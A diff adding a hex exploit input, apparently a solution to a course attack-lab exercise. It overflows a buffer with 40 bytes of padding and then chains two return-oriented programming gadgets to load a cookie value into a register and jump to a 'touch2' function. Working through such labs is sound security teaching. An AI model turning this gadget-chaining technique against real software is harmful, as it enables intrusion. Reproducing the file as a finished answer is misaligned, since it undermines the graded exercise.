@@ -1,0 +1,15 @@
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+3b 18 40 00 00 00 00 00 /* setup return for gadget 1 */
+/* instructions encode */
+/* pop %rax (gadget 1)*/
+/* nop */
+/* ret */
+/* mov %rax, rdi (gadget 2)*/
+/* nop */ 
+/* ret */
+fa 97 b9 59 00 00 00 00 /* when pop is called this (the cookie) is stored */ 
+55 18 40 00 00 00 00 00 /* setup return for gadget 2 */ 
+c8 16 40 00 00 00 00 00 /* setup return for touch2 */
